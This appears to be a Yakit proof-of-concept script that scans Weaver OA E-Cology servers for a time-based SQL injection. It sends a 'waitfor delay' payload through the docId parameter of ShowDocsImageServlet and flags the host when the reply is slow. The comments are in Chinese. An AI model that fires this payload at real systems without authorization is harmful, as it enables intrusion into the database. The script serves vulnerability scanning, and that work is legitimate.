yakit.AutoInitYakit()

handleCheck = func(target, port) {
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    // 构造 SQL 注入的 payload，包含延迟注入
    url_path = `/weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1%2F**%2Fand(select%2F**%2F1)%3E0%2F**%2Fwaitfor%2F**%2Fdelay'0%3A0%3A10'%2F**%2F`

    packet = `GET {{params(url_path)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
Connection: close`

    // 记录请求发送的时间
    start_time = time.Now()

    // 发送 GET 请求进行 SQL 注入
    rsp, req, _ = poc.HTTP(packet, 
        poc.params({
            "target": addr,
            "url_path": url_path
        }), 
        poc.https(isTls), 
        poc.redirectTimes(0)
    )

    // 计算响应时间
    response_time = time.Since(start_time)

    // 判断响应时间是否超过10秒，来检测是否存在 SQL 注入漏洞
    if response_time.Seconds() > 10 && str.MatchAllOfSubString(rsp, `HTTP/1.1 200`) {
        yakit.Info("%v 存在泛微 OA E-Cology SQL 注入漏洞", addr)
        risk.NewRisk(
            addr,
            risk.title("泛微 OA E-Cology SQL 注入漏洞"),
            risk.severity("high"),
            risk.titleVerbose("泛微 OA E-Cology 文件上传 SQL 注入漏洞 - 延迟注入"),
            risk.request(string(req)),
            risk.response(string(rsp)),
            risk.cve("no cve")
        )
    } else {
        yakit.Info("%v 未发现漏洞", addr)
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // 处理匹配结果
    if !result.IsOpen() {
        return
    }

    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port)
    }
}
